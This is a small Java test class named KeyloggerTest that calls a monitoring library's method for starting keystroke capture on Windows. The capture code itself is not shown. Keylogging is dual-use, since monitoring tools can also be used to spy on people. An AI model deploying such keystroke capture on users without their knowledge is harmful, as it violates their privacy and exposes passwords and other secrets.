package teste;

import br.com.mrezzosoftware.machineguardianmonitorprotect.windows.MGMPWindows;

/**
 *
 * @author 01837484333
 */
public class KeyloggerTest {
    
    
    public static void main(String args[]) {
        
        MGMPWindows win = new MGMPWindows();
        win.Teclado.iniciarCapturaTeclasDigitadas();
        
        
    }
}
